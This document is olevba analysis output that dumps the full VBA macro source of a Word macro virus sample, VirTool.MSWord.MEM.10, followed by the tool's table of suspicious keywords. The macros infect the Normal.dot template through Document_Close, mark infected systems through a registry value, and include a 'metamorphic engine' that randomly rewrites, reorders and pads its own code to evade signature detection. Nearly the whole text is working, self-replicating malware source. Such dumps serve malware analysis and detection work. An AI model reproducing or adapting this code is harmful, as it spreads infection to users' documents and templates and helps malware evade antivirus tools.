olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.MEM.10
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.MEM.10 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub test()
BIY
IKW
'3
'Some kind of instruction here
'1
'This instr. doesn't care where it is put
'Det2
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP"
'Inf2
nr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
Set char1 = Templates(1)
char1.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, char1.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
char1.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close"
For ik = 2 To nr
nam1 = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
char1.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, nam1
Next ik
char1.Save
End If
'Def1
If Not ActiveDocument.Content.Find.Execute(FindText:="Meta") Then
Selection.TypeText Text:="Meta"
End If
'2
'Another instr. here
End Sub
Sub IKW()
End Sub
Sub BIY()
End Sub
-------------------------------------------------------------------------------
VBA MACRO Meta.bas 
in file: VirTool.MSWord.MEM.10 - OLE stream: 'Macros/VBA/Meta'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Metamorph()
'METAMORPHIC ENGINE by MI_pirat (MEM)
'v1.0 for Word XP
ReDim nr(1 To 3) As Double
ReDim lin(1 To 3) As Double
ReDim strn1(1 To 3) As String
ReDim strleng1(1 To 3) As Double
ReDim strn2(1 To 2) As String
ReDim strleng2(1 To 2) As Double
ReDim strn3(1 To 3) As String
ReDim strleng3(1 To 3) As Double
'system determ. rutine
'mode 1
strn1(1) = "If UserName <> " + Chr(34) + "xxx" + Chr(34) + " Then" + Chr(13) + Chr(10) + "UserName = " + Chr(34) + "xxx" + Chr(34)
strleng1(1) = 2
'mode 2
strn1(2) = "If System.PrivateProfileString(" + Chr(34) + Chr(34) + ", " + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Office\" + Chr(34) + _
", " + Chr(34) + "XP" + Chr(34) + ") <> " + Chr(34) + "inXP" + Chr(34) + " Then" + Chr(13) + Chr(10) + _
"System.PrivateProfileString(" + Chr(34) + Chr(34) + ", " + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Office\" + Chr(34) + ", " + Chr(34) + "XP" + Chr(34) + ") = " + Chr(34) + "inXP" + Chr(34)
strleng1(2) = 2
'mode 3
strn1(3) = "inf=0" + Chr(13) + Chr(10) + "For i = 1 To Templates(1).VBProject.VBComponents.Count" + Chr(13) + Chr(10) + _
"If Templates(1).VBProject.VBComponents(i).Name = " + Chr(34) + "xyz" + Chr(34) + " Then inf=1" + Chr(13) + Chr(10) + "Next i" + Chr(13) + Chr(10) + _
"If inf = 0 Then" + Chr(13) + Chr(10) + "Templates(1).VBProject.VBComponents.Add vbext_ct_StdModule" + Chr(13) + Chr(10) + _
"Templates(1).VBProject.VBComponents(Templates(1).VBProject.VBComponents.Count).Name = " + Chr(34) + "xyz" + Chr(34)
strleng1(3) = 7
'infection rutine
'mode 1
strn2(1) = "ActiveDocument.VBProject.VBComponents(1).Export " + Chr(34) + "C:\a.doc" + Chr(34) + _
Chr(13) + Chr(10) + "Templates(1).VBProject.VBComponents(1).CodeModule.AddFromFile " + Chr(34) + "C:\a.doc" + Chr(34) + Chr(13) + Chr(10) + "Templates(1).Save"
strleng2(1) = 3
'mode 2
strn2(2) = "nr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines" + Chr(13) + Chr(10) + "Set char1 = Templates(1)" + Chr(13) + Chr(10) + _
"char1.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, char1.VBProject.VBComponents.Item(1).CodeModule.CountOfLines" + Chr(13) + Chr(10) + _
"char1.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, " + Chr(34) + "Sub Document_Close" + Chr(34) + Chr(13) + Chr(10) + "For ik = 2 To nr" + Chr(13) + Chr(10) + _
"nam1 = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)" + Chr(13) + Chr(10) + "char1.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, nam1" + Chr(13) + Chr(10) + "Next ik" + Chr(13) + Chr(10) + _
"char1.Save"
strleng2(2) = 9
'determ. in file
'mode 1
strn3(1) = "If Not ActiveDocument.Content.Find.Execute(FindText:=" + Chr(34) + "Meta" + Chr(34) + ") Then " + Chr(13) + Chr(10) + "Selection.TypeText Text:=" + Chr(34) + "Meta" + Chr(34)
strleng3(1) = 2
'mode 2
strn3(2) = "For Each aVar In ActiveDocument.Variables" + Chr(13) + Chr(10) + "If aVar.Name = " + Chr(34) + "Meta" + Chr(34) + " Then num = aVar.Index" + Chr(13) + Chr(10) + _
"Next aVar" + Chr(13) + Chr(10) + "If num = 0 And Templates(1).FullName <> ActiveDocument.FullName Then" + Chr(13) + Chr(10) + _
"ActiveDocument.Variables.Add Name:=" + Chr(34) + "Meta" + Chr(34) + Chr(13) + Chr(10) + _
"ActiveDocument.Variables(" + Chr(34) + "Meta" + Chr(34) + ").Value = 1"
strleng3(2) = 6
'mode 3
strn3(3) = "If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> " + Chr(34) + "Sub Document_Open" + Chr(34) + " Then"
strleng3(3) = 1
'===========================================================================
'===========================================================================
'see if the virus has infected this system
For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
s = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
'exist in system (?)
If InStr(1, s, "'Det", vbTextCompare) Then
ch = Mid(s, 5, 1)
nr(1) = Val(ch)
lin(1) = i + 1
End If
Next i
'how to determ. if normal.dot is infected?
Randomize
n = Int((3 * Rnd) + 1)
Select Case n
'===========================================================================
'determ. mode 1
Case 1
If nr(1) <> 1 Then
'if is type 2
If nr(1) = 2 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1) - 1, "'Det1"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1), strleng1(nr(1))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1), strn1(n)
End If
'if is type 3
If nr(1) = 3 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1) - 1, "'Det1"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1), strleng1(nr(1))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1), strn1(n)
End If
End If
'===========================================================================
'determination mode 2
Case 2
If nr(1) <> 2 Then
'if is type 1
If nr(1) = 1 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1) - 1, "'Det2"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1), strleng1(nr(1))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1), strn1(n)
End If
'if is type 3
If nr(1) = 3 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1) - 1, "'Det2"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1), strleng1(nr(1))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1), strn1(n)
End If
End If
'===========================================================================
'determ. mode 3
Case 3
If nr(1) <> 3 Then
'if is type 1
If nr(1) = 1 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1) - 1, "'Det3"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1), strleng1(nr(1))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1), strn1(n)
End If
'if is type 2
If nr(1) = 2 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1) - 1, "'Det3"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1), strleng1(nr(1))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1), strn1(n)
End If
End If
End Select
'===========================================================================
'===========================================================================
'infection mode
For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
s = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
If InStr(1, s, "'Inf", vbTextCompare) Then
ch = Mid(s, 5, 1)
nr(2) = Val(ch)
lin(2) = i + 1
End If
Next i
'how to infect?
Randomize
n = Int((2 * Rnd) + 1)
Select Case n
'===========================================================================
'infection mode 1
Case 1
If nr(2) <> 1 Then
'if is type 2
If nr(2) = 2 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2) - 1, "'Inf1"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2), strleng2(nr(2))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2), strn2(n)
End If
'if is type 3
If nr(2) = 3 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2) - 1, "'Inf1"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2), strleng2(nr(2))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2), strn2(n)
End If
End If
'===========================================================================
'infection mode 2
Case 2
If nr(2) <> 2 Then
'if is type 2
If nr(2) = 1 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2) - 1, "'Inf2"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2), strleng2(nr(2))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2), strn2(n)
End If
'if is type 3
If nr(2) = 3 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2) - 1, "'Inf2"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2), strleng2(nr(2))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2), strn2(n)
End If
End If
'===========================================================================
'infection mode 3
Case 3
If nr(2) <> 3 Then
'if is type 1
If nr(2) = 1 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2) - 1, "'Inf3"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2), strleng2(nr(2))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2), strn2(n)
End If
'if is type 2
If nr(2) = 2 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2) - 1, "'Inf3"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2), strleng2(nr(2))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2), strn2(n)
End If
End If
End Select
'===========================================================================
'===========================================================================
'file detection mode
For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
s = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
'is file infected (?)
If InStr(1, s, "'Def", vbTextCompare) Then
ch = Mid(s, 5, 1)
nr(3) = Val(ch)
lin(3) = i + 1
End If
Next i
'change with what?
Randomize
n = Int((3 * Rnd) + 1)
Select Case n
'===========================================================================
'detection type 1
Case 1
If nr(3) <> 1 Then
'if it is type 2
If nr(3) = 2 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3) - 1, "'Def1"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3), strleng3(nr(3))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3), strn3(n)
End If
'if it is type 3
If nr(3) = 3 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3) - 1, "'Def1"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3), strleng3(nr(3))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3), strn3(n)
End If
End If
'===========================================================================
'detection type 2
Case 2
If nr(3) <> 2 Then
'if it is type 1
If nr(3) = 1 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3) - 1, "'Def2"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3), strleng3(nr(3))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3), strn3(n)
End If
'if it is type 3
If nr(3) = 3 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3) - 1, "'Def2"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3), strleng3(nr(3))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3), strn3(n)
End If
End If
'===========================================================================
'detection type 3
Case 3
If nr(3) <> 3 Then
'if it is type 1
If nr(3) = 1 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3) - 1, "'Def3"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3), strleng3(nr(3))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3), strn3(n)
End If
'if it is type 2
If nr(3) = 2 Then
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3) - 1, 1
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3) - 1, "'Def3"
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(3), strleng3(nr(3))
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(3), strn3(n)
End If
End If
End Select
'===========================================================================
'===========================================================================
'scramble some code
inter = 3 'intechangeable lines
For j = 1 To inter
s2 = "'" + Str(j)
s2 = Mid(s2, 1, 1) + Mid(s2, 3, 1)
For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
s = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
If s = s2 Then lin(1) = i
Next i
'interchange with what?
Randomize
n = Int((inter * Rnd) + 1)
'now find the line to scramble with
If n <> j Then
s2 = "'" + Str(n)
s2 = Mid(s2, 1, 1) + Mid(s2, 3, 1)
For k = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
s = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(k, 1)
If s = s2 Then lin(2) = k
Next k
'OK, now that I found it, switch their places:
'get the original lines
s = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(lin(2), 2)
s2 = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(lin(1), 2)
'delete them (only the old positions) and then insert the new ones
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(2), 2
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(2), s2
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines lin(1), 2
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines lin(1), s
End If
Next j
'===========================================================================
'===========================================================================
'dummy calls and subs
'add 1 sub at the end of the virus
ln = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines + 1
p = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
s = "Sub " + p + "()" + Chr(13) + Chr(10) + "End Sub"
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines ln, s
'add a call to the sub at the begining
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 2, p
'bye bye
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

